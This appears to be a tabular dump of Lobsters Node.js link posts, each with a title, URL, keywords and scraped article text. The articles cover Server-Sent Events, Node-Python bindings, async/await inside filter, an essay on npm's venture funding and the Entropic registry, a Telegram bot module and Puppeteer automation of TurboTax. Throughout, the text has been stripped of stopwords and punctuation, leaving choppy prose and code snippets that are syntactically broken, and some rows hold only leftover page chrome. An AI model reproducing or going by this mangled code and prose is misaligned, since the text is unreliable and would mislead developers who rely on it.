independent autonomous team far approach seen many realworld case micro frontends deliver benefit able apply technique gradually time legacy codebases well new one whether micro frontends right approach organiation hope part continuing trend frontend engineering architecture treated seriousness know deserves
104,Lobsters,nodejs,Node.js programming,Server-Sent Events (SSE): A conceptual deep dive,https://www.ably.io/concepts/server-sent-events,serversent event sse conceptual deep dive,serversent event bit background serversent event work would use would use websockets long polling thing consider support checking support coverage yaffle eventsource polyfill using scale publishsubscribe realtime messaging platform endpoint implement using realtime messaging platform use serversent event best way possible serversent event support ably apps service apis ably advocated supported open realtime protocol ably adapter serversent event websockets proprietary realtime protocol ably get touch blog reference reading,rapidly heading toward eventdriven world data stream apis serversent event fill specific niche new world open lightweight subscribeonly protocol eventdriven data stream article explores sse came work hood rapidly adopted developer bit background sse based something called serversent dom event first implemented opera idea simple browser subscribe stream event generated server receiving update whenever new event occurs led birth popular eventsource interface accepts http stream connection keep connection open retrieving available data connection kept open closed calling eventsourceclose serversent event sse sse standard describing server initiate data transmission towards client initial client connection established provides memoryefficient implementation xhr streaming unlike raw xhr connection buffer full received response connection dropped sse connection discard processed message without accumulating memory sse designed use javascript eventsource api order subscribe stream data popular browser interface client request particular url order receive event stream sse commonly used send message update continuous data stream browser client nutshell serversent event update pushed rather pulled requested server browser sse work connection sse typically begin clientinitiated communication client server client creates new javascript eventsource object passing url endpoint server regular http request client expects response stream event message time server leaf http response open event send decides connection open long enough considered stale client explicitly close initial request sse work connection request close quick example opening stream sse var source new eventsource urltoeventstream sourceonopen function consolelog connection stream opened sourceonerror function error consolelog error occurred receiving stream error sourceonmessage function stream consolelog received stream stream would use sse ideally requesting data server simple xmlhttprequest however scenario want keep connection open using xhr streaming brings set overhead including handling parsing logic connection management sse come sse provides layer connection management parsing logic allowing u easily keep connection open server push new event client become available would use sse nature realtime messaging streaming data mean different protocol serve different purpose better others multiplexed bidirectional streaming websockets perfect iot device limited battery life mqtt suitable sometimes overkill sse perfect scenario efficient unidirectional communication protocol needed add unnecessary server load happens long polling need protocol predefined standard handling error want use httpbased method realtime data streaming need unidirectional protocol better latency user httpbased way streaming data example sse already use subscribing feed cryptocurrency stock price subscribing twitter feed receiving live sport score news update alert thing consider sse thing sse challenge major limitation sse unidirectional way pas information server client way pas additional information time connection many developer choose query string example stream url http examplecomsse developer add query string pas information user id http examplecomsse unidirectionality cause additional problem client loses connection reliable way let server know way perform clienttoserver heartbeat sse based tcpip mechanism alert server client loses connection always work well server always immediately realise connection lost however minor limitation sse sse support sse widely supported across popular browser turn mean supported range mobile embedded iot device said attempting implement sse worth checking support coverage browser application service support browser support sse june also worth checking eventsource support see example using polyfill eventsource window use polyfills var source new eventsource url great example polyfill eventsource yaffle eventsource polyfill using sse scale since sse based http protocol scaling achieved mean loadbalancing however need ensure sort shared resource behind server kept sync new event update many choose handle publishsubscribe architecture design pattern pubsub event sent directly client instead sent broker broker sends message subscriber may include original sender send client host pubsub mechanism could consider using redis rather offload complexity scaling focus core product engineering rely realtime messaging platform offer eventstream sse endpoint check detailed explanation implement sse using realtime messaging platform support protocol use serversent event best way possible sse easy implement often time developer tend get stuck sending data sse represents data actual stream need send json sse look something like reswrite data n reswrite data foo bar n reswrite data baz reswrite data nn developer used writing pure javascript implementing sse might end invalid json parsing client side using library abstract plain javascript help example using expresssse library using express web framework example sse server using node express appget stream req re resstatus set connection keepalive contenttype texteventstream reswrite data hello nn looking code notice three thing texteventstream content type header browser look confirm event stream keepalive header tell browser close connection double newline character end data indicates end message however looking example useful sending one event using setinterval function continuously check database new connection use expresssse library example expose method emit stream anywhere app necessarily event stream route var sse require expresssse var sse new sse appget stream sseinit always call ssesend anywhere sse variable available see result stream let content test data jsonstringify datenow ssesend content serversent event support ably sse lightweight protocol implementation usage standpoint still infrastructure consideration operating eventdriven stream scale continue move toward world eventdriven data stream apps service apis sse always right choice protocol fulfill streaming need ever building platform futureproof infrastructure need something even tech giant know best choice ably data stream network developer use cloud platform global network power realtime apps service internal microservices create streaming apis mission deliver bestinclass interoperable realtime platform developer trust future best build without worrying infrastructure always advocated supported open realtime protocol using ably adapter developer stream data using open protocol choice including serversent event websockets mqtt stomp amqp proprietary realtime protocol continue add support new protocol including grpc currently development information ably help gain realtime advantage get touch check blog reference reading
105,Lobsters,nodejs,Node.js programming,NodeJS and Python interoperability,https://fridgerator.github.io/2019/06/14/nodejs-and-python-interoperability.html,nodejs python interoperability,nodejs python interoperability calling python function node drumroll apa nan embedding python embedding python awasucom writing python wrapper c code function initialize python interpreter c function portability blog post joão ventura conclusion comment powered disqus,nodejs python interoperability jun calling python function node nodejs python interoperability relatively easy doable talking using string interpolated system call parsing command line return janky method language written cc interop possible via native binding follow journey using low level api two language really dont even like much full honest spirit blog beer drumroll apa engine node written create javascript class function c convert parameter return value javascript type type pretty easily found useful data processing c javascript slow could return large array javascript plot graph without need serialize deserialize large object first using nan native abstraction nodejs make even easier going get specific using nan however plenty blog post topic plenty native node module use example embedding python somewhat similar concept exists python embedding python run snippet python code open existing file module call function directly converting c python type parameter return value python interpreter still required work however portability still achieved later good blog post awasucom give detailed explanation example writing python wrapper c code full source code available first thing initialize function set search path python find interpreter required library pas pysetpath next initialize python interpreter append current directory python system path found local python module finally tell python decode toolspy file import call later added multiply function node module export call multiply c function checking argument create couple double variable using handy nan helper method load python function using pyobjectgetattrstring make sure found callable function pycallablecheck assuming two valid argument passed javascript found callable multiply function next setp convert two double variable python function argument create new python tuple size add double variable tuple magic moment waiting pvalue pyobjectcallobject pfunc pargs assuming pvalue null successfully called python function node received return value convert pvalue long set return value node function pretty freakin cool imo portability code example downloaded built python locally check bindinggyp file notice local folder includes also possible build portable python distribution ship node application could useful electron application another detailed blog post joão ventura describes osx conclusion certainly much work using childprocessspawn run python extra effort worth dont really know direct call benefit ability check argument return type even possible create hexdump python file c char variable include compile time using xxd toolspy going playing around idea find else might possible please enable javascript view comment powered disqus
106,Lobsters,nodejs,Node.js programming,Reality Projection with Magic Leap One in Exokit,https://www.youtube.com/watch?v=m_QntqZmd_Q,reality projection magic leap one exokit,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature reality projection magic leap one exokit youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature reality projection magic leap one exokit youtube
107,Lobsters,nodejs,Node.js programming,Example of use of the Object.fromEntries new entry (pun intended) to flatten nested objects props,https://gist.github.com/jfet97/9e4b9033baf6f272d695302e78c60220,example use objectfromentries new entry pun intended flatten nested object prop,reload reload,instantly share code note snippet object flattening const obj b c f const re objectfromentries flatprops objectrecursiveentries obj ab ac ade g function flatprops arr parentkey null const re const key value arr arrayisarray value respush flatprops value key map k v const keytoinsert parentkey parentkey k k return keytoinsert v else const keytoinsert parentkey parentkey key key respush keytoinsert value return re function objectrecursiveentries obj const re const key value objectentries obj value typeof value object respush key recursiveentries value else respush key value return re perform action time signed another tab window reload refresh session signed another tab window reload refresh session
108,Lobsters,nodejs,Node.js programming,This is how our brain detects shapes,https://medium.com/the-guild/this-is-how-our-brain-detects-shapes-10cadefc8134,brain detects shape,note order matter,given sketch open try lengthen first last vector hope find intersection create closed arealook closed area within given sketch reduce area pas certain threshold area le constant value splice verticesassuming single area try match circle calculating standard deviation radius center shape one vertex standard deviation le constant value must circleif circle found reduce level detail polygon splicing vertex cause insignificant angle changesometimes might single vector set vector case closed area given sketchnow part slightly complicated gon na try match normalized polygon one shape atlas predefined shape besides actually detecting whether polygon represents certain shape also need take found match atlas transform match closely possible average property polygon atlas may consist closed polygon triangle rhombus trapezoid hexagon etcshape matching done score calculation based different parameter higher score likely accept certain shape intended one calculate score drawn polygon relatively predefined shape atlas amount vector highest score greater certain threshold would score calculation shape done based cosinuses angle vector ratio vectorsnote order matter matter series start end long consistency value gon na evaluate scoresince shape vector likely receive lower score nearly case use dynamic threshold increase decrease based target amount vector testing different variation calculation method starting naive one linear method reached conclusion radialexponential one would accurate use case radialexponential score threshold calculatoronce determined shape polygon match start process trying transforming predefined shape property closely possible polygon scale angle direction positionfor scale simply calculate average length vector divide value find right multiplicationfor angle repeat process addition try different variation radian let r average radian polygon r r π r π r r r r r repeat angle matching mirrored version shape aka different direction position scaled rotated potentially mirrored shape position center top drawn polygon centerout transformed shape different angle variation take one whose average vertex deviation smallest compared drawn polygon verticesit might possible found matching shape atlas case return normalized polygon unless edge polygon edge try match rectanglefirst try determine whether polygon intended right angle calculating cosinuses comparing evaluated score certain threshold indeed rectangle normalize calculating average vertical length horizontal length new baseshape repeat process shape matching atlas
109,Lobsters,nodejs,Node.js programming,The economics of package management,https://github.com/ceejbot/economics-of-package-management/blob/master/essay.md,economics package management,economics package management,economics package management going tell story owns javascript language common got need change story money much money ownership control going tell version story know tell one human imperfect knowledge point view story story anybody could tell long way tell good version one slice story part heart last year cto npm inc company run javascript package registry give expertise topic people world also come along point view invite keep mind listen story part story javascript package management bet know time done story know part matter story money people money people make money open source software mostly people write story accidental decision made without knowing one made consciously decision worked today story ownership control consequence also story much ready go story start late yahoo back glory day yahoo heart lot javascript activity back employed lot javascript thought leader like douglas crockford pushing state art forward might good business plan good tech stack one thing yahoo tech stack package manager called ypm apparently neat thing javascript starting interesting programming language around thanks jquery modern browser adhering spec serverside javascript hot topic several project motion attempting make happen conference part serverside javascript action jsconfeu ryan dahl announced nodejs nodejs turned serverside javascript platform people wanting early node community swept interesting people enjoyed bleeding edge possibility brandnew ecosystem nobody done much invention yet several people involved early node figured early package management node would useful started writing package manager yes one several competitor one people yahoo employee extrainto node quit job could write something inspired yahoo package manager open source nodejs particular programmer clever couple useful way got deeply involved node project let work implementation commonjs module spec node thing beat package manager like give project pull request support package manager instead others package manager good enough supported inside node well enough node package manager npm started packaged node instead living separate thirdparty thing downloaded right downloaded node official status granted node project continues today somewhere around time joyent bought node ryan dahl paltry amount money notice already interesting economic territory man invented nodejs tool used million people daily develop javascript made couple ten thousand dollar whoever making money node today inventor least make living joyent hired note hear somebody ought know dahl collected ten thousand okay short term still le overall value generated however programmer wrote npm also hired joyent work node important plot point retained ownership npmjsorg domain name npm source code invention intellectual property turn joyent way node source turned joyent decision matter later take note dahl left node project npm owner stepped lead stead time npm package manager left standing right started trickling onto scene anyway javascript programmer like writing javascript write tool javascript started writing javascript node liked meanwhile people like figured node handy writing io multiplexing service reactor pattern pretty awesome node builtin worry thread yay went people joined u fun javascript train node got pretty popular meant npm got popular great right well thing npm cli tool grab code slam onto hard drive nodemodules fact cli probably least important part npm machinery despite frequently interact npm importantly centralized package registry repository right beginning registry running inside couchdb database domain today registry list whole lot javascript package name author many version registry made node package easy find made installing fast reliable lot unpack think worth moment time looking right advantage centralization npm registry centralized centralization obvious usability need go one place look something one place enforce rule thing looking look provide kind information maybe even vanish whim person made get bored centralization lot advantage user one source something shortcircuit lot work finding thing looking lot go programming recently strange try find go package everywhere way find google look oldfashioned text list maintained know yahoo original thing install go package install github repos could go away freaky expectation come using npm year absence central registry go help appreciate npm gave centralization recently huge trend internet blogging example moved centralized hosting platform stick around like tumblr medium social medium centralized open source centralized github even though git exists support decentralization npm centralized registry node package great except node started taking started great downside centralization cost centralized downside npm registry needed run server database server cost money money coming year node package manager ran donated hosting written help people involved implementing couchdb couchdb database freeloaded couchdb hosting service long time treated advertisement couchdb service offered iriscouch iriscouch bought nodejitsu continued host npm registry cheap ad couchdb node hosting service went started using node node package registry started getting serious use stopped cheap ad various lazy shortcut taken implementing registry caused pain registry saw real use oct registry clear something done npm needed better server npm needed maintainer nt mostly ignore day job npm needed money unusual problem language ecosystem face rubygems cost money run perl solved problem long ago network cpan mirror npm sole owner decided try something language package manager nt tried decided try take vc funding turn software company seen little money joyent gave ryan dahl much nodejs turning worth even joyent terrible job making money possible retained ownership npm even running node project quit joyent founded company npm inc took seed funding vc firm node project made decision allow continue give npm inc special privilege software packaged along node nt know internal dissention nt part node project entering moribund period end possible decision made inaction anyway node project continued decide give privatelyowned company special privilege bundling product fine made decision allow made critical decision right entire rest javascript community voted foot kept using npm registry thus tacitly agreeing fine ceej hear say nt using npm nt around yes nt inherited decision probably never realized decision npm exists fact javascript life never questioned might aware even cared company time controversial decision nodejitsu hosting npm free charge nt happy fix scalenpm campaign ended raising money time npm owner raising vc money legal maneuverings know little know npm exited nodejitsu hosting quickly messily two company fighting involved lawyer later npm exited joyent hosting quickly two company also fighting money stake relationship dissolve friendship made open source fun end strain competing money moment time made decision also decided let javascript language common owned vcs frame way though decision told making decision contribute could toward making node successful really liked programming node npm first place ever participated open source development thrilled able make go better believed story told npm ip owner would make npm inc selfsustaining server would hum along happily dispensing package mass story taken u npm inc company vc money start hiring people first hire raquel vélez somebody heard speak conference second hire ended leading npm engineering team well know part story fact scale npm rather ludicrously scaled well node exploded started using node build everything javascript npm became unquestioned part every javascript programmer workflow reinvented web development way could nt npm great success highlight excellent career felt pretty great let pause moment successful zenith node package manager let talk money ryan dahl living tropical island nt james halliday retired tropical island dominic tarr living yacht instead sailboat jan lehnardt day job know name author software laptop right software beating heart thousand opensource program use every day every fortune company run software written people dozen others contributed software node npm early day nt wealthy despite enormous value created software wrote capitalism supposed reward people like practice think people contributed javascript common without expecting wanting money return might wish tropical island never expected money mind wrote module invented node ecosystem back early day node user node package manager mostly knew something else exchanging gift peer kind economy much money native american people northwest pacific coast u canada economic practice based giving gift rather receiving gift called practice potlatch potlatch social system violently suppressed western colonizer word stay u urge human thing potlatch motivation brings u motivated people put conference well many speaker potlatch culture early node culture people chasing interest shared software library make everybody node program work better little potlatch urge every open source project announced human supported company particular modern expression potlatch culture nt getting violently suppressed capitalism love one well found way weaponize u weaponization eric raymond style open source likely aware difference free software richard stallman open source eric raymond style stallman gnu license aim require user shared source code give build away freely well least give code away freely argue whether gnu license achieves goal people argue length want rehash question merely observe esr style open source give away code permissive license style likely style practice probably use permissive mit bsd license software treat gpl like poison capitalism love esropensource company get lot good stuff free capitalism take even telling get hired github resume tell hand outstretched take free code sell make dominic tarr give away pullstream every fortune company get use work without compensating reality person story give away intellectual property person story likely make pile money course going make anywhere near much venture capital fund paid people truly well story people money begin people nothing javascript people effectively common let talk term keep using javascript common mean common singular noun meaning collection resource accessible member society could natural resource like air breathe could also mean field share graze sheep u javascript community common includes language spec owned organization set allow javascript stakeholder cooperate design build done pretty well javascript another thing common includes shared code source code babel source code webpack source code typescript react thousand package make common registry list shared code also part common share stuff find another thing part common set convention evolved around way agree name update thing share wholly owned vcfunded private company last year conference ryan dahl inventor node came back make another announcement talked design mistake thought made node one unfortunate centralized privately controlled even repository module ryan dahl first saw inclined argue dahl centralization agree comment private control let talk moment list shared javascript package made share private control mean policy managing list controlled single company javascript community get package removed dispute among people using package name resolved controversial topic remember leftpad incident package dependency dependency vanished registry suddenly breaking every ci build depended installing babel leftpad suddenly vanish buy drink tell unpublication policy nt exist fight making life better worse daily want package signing good luck feature nt make company money unlikely see perhaps fear security incident major public outcry would get done note talking package registry almost exclusively registry closed source policy regulate open influence npm cli open source unimportant api open important building block would need writing cli opensource npm control third use another client interact npm anyway tell cli nt matter seek community participation api open company chooses allow open nt control also ca nt influence api get change ecosystem might benefit management common opaque remain opaque company owns financial incentive change know package data know trust trust without accountability javascript community way hold npm inc accountable could tell trusted team knew motivation good good answer wrong relied way hold accountable test trustworthy whoop npm inc private entity control common make evil make good either question benevolence wrong question ask npm benevolent institution one possibility ended day owner took vc funding instead putting foundation form community ownership decision turned npm financial instrument mean something specific say financial instrument monetary contract party widget created traded npm inc thing owns language ecosystem thing owns registry package collection software packaged cli use every thing might well collection pork belly far owner concerned make contract trade bit around npmthecompany mean turning money money people important keep mind evaluate interaction evaluate interaction people represent mean look incentive money turn incentive lot people story follow money company love even one make thing like phrase marketing message designed get mistake financial instrument something might friend marketing message pretty powerful year nt got cuddly wombat mascot awesome sticker add red emoji heart board right npm love npm love npm inc delaware corporation founded financial instrument intended turn money money handful men initially knew wanted start talking problem public instead corner friend thought fighting uphill battle vcfunded package management company beloved work one reason participated whole rise made possible stood stage front parroted marketing message meant c j silverio feel affection true nt think anybody stand front say npm love without yelled npm burned goodwill last month nt happen choice made people run company made choice though doubleddown happen cuddly wombat get set fire let move story forward shall pick oh know drinking firehose javascript package free think care come paying server type install package arrive bandwidth cost money somebody pay case npm spending dollar given venture capital investor pay server bandwidth eventually inevitable consequence taking vc money started knock door clear throat ahem remember u want money established vcfunded company financial instrument start making famous return investment promise somehow owner going end winner always profitable manage tell persuasive enough story raise money keep scheme going absolutely nothing wrong taking vc money inherently opinion many venture goal wellaligned goal vc money vc money shaped alike fund play long game fund like futureshape explicitly interested bettering world mostly vc money interested returning investment incentive point make money sold new owner enough money return investment ten time grow fast go big go home remember npm inc obligation people people donated work toward dragon hoard package npm inc make money failing tell story making money raise money spend making money exyahoo employee thought sharing yahoo package manager world pretty neat idea right many idea beyond turn running company lot work hired new ceo work well go first thing new ceo wanted change npm know thing exported marketing message sustainable compassionate culture first thing go new guy arrived npm pr trouble result probably known community enjoys drama possible saint charge would nt standing maybe would even decent human spot big problem solve problem public registry place package indexed part care part enormous drain npm budget simultaneously value investor control javascript development javascript development proxy willingly data data gathered usage valuable part every packagelock file npm ever seen sitting bucket somewhere chockfull interesting data nugget also perverse incentive influencing api design company incentive reduce number time client phone home installing call homeward generate valuable data registry drain npm work keeping continuous nearexponential growth continuous time work occupied tiny engineering team team tiny well npm money pretty bad job telling story new investor raising money story tell bad potential investor knew sure either way npm enough money keep free javascript flowing make decent product sell eventually vc bill going come due eventually show growth die follow money situation npm inc fully reckoning true destiny way make money people javascript programmer maybe going show growth maybe going die maybe going something none u like make money leveraging enormous data trove view development habit every single one aware npm nt love u nt love employee either good u still installing package one find situation uneasy suspect wo nt last long story nt go way major actor could chosen differently right including choice recent month common hand something believe trust incentive aligned community javascript programmer need going one answer nothing say ca nt anything made community decision stuck wait npm inc fail nasty couple month replacing registry much like answer imagine npm inc hand corporate pirate somebody take ailing company adversarially shake change somebody like might incentive keep public registry running might consider something mined usage data npm user held hostage decision board director nt done good job thus far find scenario quite possible optimistic outcome larger corporate savior might swoop rescue npm beloved package registry keep common alive even registry end owned secure company think merely punt problem road microsoft benevolent actor today sure nt always google benevolent actor acting exactly like monopolist microsoft like u avoid repeat talk decade think end agree ryan dahl javascript package registry privately controlled think centralization burden inevitably lead toward private control well server always cost money diffuse load among many people share burden probably sound impossible thinking npm entrenched month ago might agreed company set fire every bit goodwill ever reason anybody see trust people like ever earned benevolent steward poof flame bad community value people look intentional exasperated gesture also much person handwringing donothing answer sit well human confession make believe potlatch economy despite everything think good u human give thing think peace idea corporation make money announcement would like give away something today giving away colleague chris dickinson working together today like introduce entropic federated package manager javascript entropic apache licensed everything need run registry included entropic come cli calling d entropy delta entropic offer new api publication installation one drastically reduces amount network traffic needed unit installation single file tarball entropic federated depend package entropic instance home instance mirror dependency remain selfsufficient entropic mirror package install legacy package manager requirement list short dockerized sign github account oauth provider pluggable show short video demo project month old ready anybody people bleeding edge use yet selfhosting already feature fairly huge todo list web site speak right instance need one repo long list issue interested goal entropic first want prove option beyond nothing sit wait npm shut something optimistic proactive power second chris among handful human deeply understand problem language package registry need solve particularly scale expertise needed community right want share choose give something valuable away potlatch gift expertise third think right pendulum swinging away centralization want lend push swing last decade consolidation monolithic service coming decade going federated federation spread cost spread control spread policymaking hand control slice language ecosystem hope giving entropic away help u take language common back take back held hostage need venture capitalist take back possible u make decision different decision made end take back community million developer power take back entropic kickstart movement take language back lot say entropic lot work time share learned npm love learned private company control time move foot believe node community good comprised good people talent interest building amazing thing defined single corporation let control destiny future web stake need take back control need finish building entropic together love two human being u please something good
110,Lobsters,nodejs,Node.js programming,A new take on website analytics,https://volument.com,new take website analytics,analytics conversion optimization true engagement real bottleneck faster anything else view use case missing data true conversion flow correct math real winner view use case privacy first view data policy century different google analytics volument different mixpanel volument different optimizely,analytics conversion optimization volument provides missing data get lead global design change big content update new version front page volument show work broken true engagement volument monitor visitor activity reveal visitor paying attention content real bottleneck genuine understanding engagement volument show weak spot collect biggest win lowest possible effort faster anything else volument order magnitude faster firstgeneration ab testing tool view use case click see website optimization work missing data content marketing blogger designer marketer finally move silly button test actually make impact true conversion flow volument show visitor build awareness desire taking action way people actually convert correct math volument us advanced cohort analysis accurate conversion rate finally compare audience way make sense real winner volument us traction rank marketing good bad finally see true effectiveness campaign view use case click see content marketing work whatever designer developer volument show worksjukka santalaceo creature ad privacy first volument track personal data focus mass statistical significance individual relevant conversion optimization view data policy analytics ab testing century say goodbye complexity uncontrolled cost volument far easiest way grow online different google analytics google analytics tell everything happening volument focus work volument different mixpanel mixpanel generalpurpose event tracker good product analysis error tracking server monitoring volument conversion optimization volument different optimizely optimizely visual ab tester designed button label background color microoptimizations volument focus bigger picture product side market side smaller v nt need crazy amount traffic get statistically significant result script homeindex style homehome desc volument provides missing data get lead title analytics conversion optimization url key created modified creatediso modifiediso
111,Lobsters,nodejs,Node.js programming,PM2 NPM Package Breaks Builds Worldwide Because Of Failed Telemetry Endpoint,https://github.com/Unitech/pm2/issues/4289,npm package break build worldwide failed telemetry endpoint,issue deleted reload reload,issue deleted perform action time signed another tab window reload refresh session signed another tab window reload refresh session
112,Lobsters,nodejs,Node.js programming,When a Filter Goes Wrong: Adventures in Async/Await,https://www.jimhribar.com/adventures-in-async-await/,filter go wrong adventure asyncawait,nodejs scenario given array object filter subset output scenario given array object filter subset using function output scenario given array object filter subset using asynchronous function output scenario given array object filter subset using asynchronous function asyncawait applied output solution given array object filter subset using asynchronous function asyncawait applied inside loop output eslint visual studio code webstorm,happens regularly software development partially completed code nodejs script handed containing enhancement existing logic pick complete went upon way adding rest required change code could tested thing started get fishy data processing job idea long would take demanding would started thought might take second minute began browsing web macbook started sound like commercial airliner website opening application getting slower something wrong could script demanding stopped job began investigation nothing seemed place barely added anything ran thing tried altering logic added luck would removed change tested original seemed fine could possibly wrong additional code given much fetch data database manipulate standard filter call async method await asyncawait waiting wait oh one bug following generic recreation change transpired code eventual revelation scenario given array object filter subset const value const result valuesfilter value return value consolelog result output work common expected value keep otherwise dropped scenario given array object filter subset using function const double function value return value const value const result valuesfilter value let x double value return x consolelog result output still work expected surprise standard function call twice value keep otherwise dropped scenario given array object filter subset using asynchronous function const double function value return new promise resolve settimeout function resolve value const value const result valuesfilter value var x double value return x consolelog result output code work filtering work familiar asynchronous code knew right away result function call going return value want promise messing condition developer working code knew well run code see output displayed almost immediately delay program completes asynchronous operation still firing even thought filter method returned scenario given array object filter subset using asynchronous function asyncawait applied const double function value return new promise resolve settimeout function resolve value const value const result valuesfilter async value var x await double value return x consolelog result output huh original set value delay still present developer assumed also willingly accepted time adding asyncawait sufficient wait promise resolve see output appeared different impact altogether nothing tried would get work code interpreted call firing fast could waiting completion last crippling machine async inside filter seemed odd sure running followed considerable amount random searching exponentially denial came eventually accept filter support asyncawait synchronous function even misguided attempt add another await outside filter confirmed naive interpreter finally generated error dead end regressed back le elegant solution describe next mean love least readable u mere mortal happenstance last revision code changed approach job removed anyways likely clean filterlike solution us asyncawait somewhere left exercise reader solution given array object filter subset using asynchronous function asyncawait applied inside loop const double function value return new promise resolve settimeout function resolve value const value const result const job async let value value await double value resultspush value job consolelog result output great finally work traditional loop build secondary array slow make sad filter come box able await passed async function beyond limitation real biggest shock throughout whole learning process though single tool detected misusage eslint identify visual studio code input even installed webstorm selfproclaimed javascript writing unfortunately nothing helpful one thing proclaim confidence forever test code
113,Lobsters,nodejs,Node.js programming,A module to help telegram bot devs manage a flow of actions that have to be executed in row,https://github.com/jfet97/ntfm,module help telegram bot devs manage flow action executed row,node telegram bot flow manager main feature example order api hashable telegramflowfactory telegramflow telegramflowregister id hashable action array void action data object telegramflowexecute id hashable data void telegramflowhasinqueue id hashable boolean telegramflowgetactionsqueuelength id hashable number telegramflowclear id hashable void credit alexander cerutti node telegram bot flow manager nodetelegramoperationmanager,node telegram bot flow manager little module help telegram bot devs correctly manage flow action executed row module framework agnostic find example use main wrapper telegram bot api nodejs developer main feature module handle sync asycn action let force repeat last one something go wrong eg user sends uncorrect reply example built bot simple image generator ask order user width height background color foreground color format optional text step constrains take full advantage possibility repeat action constrains respected waiting check example folder api hashable number string telegramflowfactory telegramflow main constructor function let u retrieve telegramflow instance action registered const telegramflowfactory require ntfm const flow telegramflowfactory telegramflowregister id hashable action array void method used action registering need unique id user need action list strongly advise use telegram userid flowregister id function firstaction async function secondaction important know one flow time composed number action allowed consecutive call method ignored action current flow performed special need use one telegramflow instance action action must function anonymous asynchronous action represents single step bot flow possibility receive data previous step action end successfully returned value passed next waiting action force replay action must return specific object repeat true action called passing data object following property previousresult null initially value returned previous successfully ended action action return repeat true replay previousresult wo nt overriden executecalldata data sent user let flow run next section const validsyncaction const validasyncaction async const validsyncactionwithdata data const validasyncactionwithdata async data telegramflowexecute id hashable data void action registered need way let user interact execution action need user data regardless arrive eg direct message keyboard inline keyboard etc execute method present purpose requires id associated list action execute data pas next action botonmessage function messageslistener message flowexecute messagesenderid message action registered execute call performed call automatically ignored though see soon better approach telegramflowhasinqueue id hashable boolean call method know action queue specific id could really useful two situation avoid useless call execute method call would internally discarded botonmessage function messageslistener message flowhasinqueue flowexecute messagesenderid message avoid useless call register method previous registered action still pending botoncommand register function commandlistener message flowhasinqueue botreply messagesenderid unable perform operation must end previous started flow return flowregister messagesenderid telegramflowgetactionsqueuelength id hashable number call method know many action queue specific id could used instead hasinqueue method telegramflowclear id hashable void user forgot reply bot maybe even eliminating message chronology want let user abort current flow case clear method let clean situation choose create bot command andor start timeout registration action botoncommand register function commandlistener message flowregister messagesenderid settimeout flowclearbind flow messagesenderid botoncommand clear function commandlistener message flowclear messagesenderid credit thanks alexander cerutti work topic node telegram bot flow manager simplified enhanced reimplementation correct handling asynchronous action nodetelegramoperationmanager
114,Lobsters,nodejs,Node.js programming,Automating TurboTax Data Entry With Puppeteer,https://www.dannyguo.com/blog/automating-turbotax-data-entry-with-puppeteer/,automating turbotax data entry puppeteer,automating turbotax data entry puppeteer betterment free edition intuit turbotax online form turbotax integration doesnt allow import txf file lobbying effort questionable practice puppeteer nodejs chrome spent time automating process github parsing csv file tax form page xsv neatcsv using puppeteer control existing installation resizing window would also resize viewport logging prompt pas variable evaluate webdriverio nightwatchjs example singlepage application treat history api waitfor entering transaction issue question type select click cs transition conclusion found multiple issue phantomjs stopped development selenium experimental support edge switching chromium opera brave,automating turbotax data entry puppeteer use betterment investment tax return wanted use free edition intuit turbotax online nonretirement account investment transaction must documented tax return form hundred transaction account nt want enter manually betterment turbotax integration work automatically turbotax nt allow importing investment transaction unless premier plan also could nt import txf file feature available desktop version turbotax nt want pay premier plan part intuit lobbying effort simpler tax filing system questionable practice seemed like great opportunity try puppeteer nodejs library controlling chrome developed chrome team end probably spent time automating process would taken enter transaction manually learned new tool hope reuse script future available github name brokerscribe demo end result running half speed browser nt support embedded video parsing csv file first downloaded csv file betterment tax form page removing extraneous comma end header row used xsv look available column xsv header account description symbol cusip date acquired date sold gross proceeds cost basis gain loss wash sale loss disallowed federal income tax withheld type gain loss noncovered security reporting category inspected value get idea data look like xsv table xsv sample account description symbol cusip date acquired date sold gross proceeds cost basis gain loss wash sale loss disallowed federal income tax withheld type gain loss noncovered security reporting category danny taxable account sh vanguard total international bond etf class bndx shortterm danny taxable account sh vanguard ftse developed market class vea longterm danny taxable account sh vanguard ftse developed market class vea longterm used neatcsv read data const f require f const csv require neatcsv async let transaction fsreadfilesync transaction await csv transaction using puppeteer launched puppeteer nonheadless mode browser ui would actually appear controllable outside script launch bundled version chromium chrome built possible control existing installation chrome version library guaranteed work bundled browser also turned default viewport resizing window would also resize viewport const puppeteer require puppeteer async const browser await puppeteerlaunch defaultviewport null headless false logging first step turbotax workflow logging const page await browsernewpage await pagegoto http myturbotaxintuitcom used prompt interactively collect authentication info considered passing info environment variable ran twofactor authentication later needed able collect dynamic code const email password await prompt type text name email message email address type text name password message password style password set input value j finding pas variable evaluate await pageevaluate email documentgetelementbyid iusidentifier value email documentgetelementbyid iusremember checked false email next figure handle waiting ui ready hitting submit experience part common source flakiness ui test using tool like webdriverio nightwatchjs tried following example documentation await promiseall pagewaitfornavigation pageclick iussigninsubmitbtn unfortunately kept getting error timeouterror navigation timeout exceeded exceeded first tried playing around different waitfornavigation option realized site built singlepage application puppeteer treat history api usage navigation event site nt use history api merely update form page tried wait existence password field instead using waitfor await promiseall pagewaitfor iussigninmfapasswordcollectioncurrentpassword pageclick iussigninsubmitbtn solution worked filled password way filled email next part form twofactor authentication using code sent email however triggered time even unchecking remember first part log form meant nt stable element wait original solution put sleep check twofactor authentication form appeared await pagewaitfor millisecond await page iusmfaoptionssubmitbtn null collect code submit however realize much better solution would use selector two element one possible path something like await pagewaitfor iusmfaoptionssubmitbtn dashboard method avoids antipattern sleeping hardcoded duration slows thing make code brittle since duration might long enough server slow respond client poor internet connection etc entering transaction logging enter transaction fill page matched field form respective column csv file continued set value directly inpage j await pageevaluate transaction documentgetelementbyid value transactiondescription documentgetelementbyid value transactiondatesold documentgetelementbyid value transactiondateacquired documentgetelementbyid value transactiongrossproceeds documentgetelementbyid value transactioncostbasis let category transactionreportingcategory category else transactionreportingcategory category else throw new error unexpected reporting category documentgetelementbyid value category transaction ran validation error even though could see value field trying continue received error message field blanked suspected form validation run user enters data setting value directly validation bypassed thought user left field blank reading issue question found better approach use type select method instead setting value j using method fixed issue await pagetype transactiondescription await pageselect category submitting transaction radio selection choose wanted submit another one tried clicking enter new transaction radio puppeteer click method await pageclick time ergonomic approach nt work hitting continue page thought nt make choice tried clicking radio j able continue await pageevaluate documentqueryselector click final issue ran would get error node either visible htmlelement trying fill info new transaction page guess root cause site animates dom change like appearance form likely cs transition puppeteer waitfor detects element existence dom nt know element visible click handler attached etc added one second sleep workaround future improvement would find way wait end transition end script 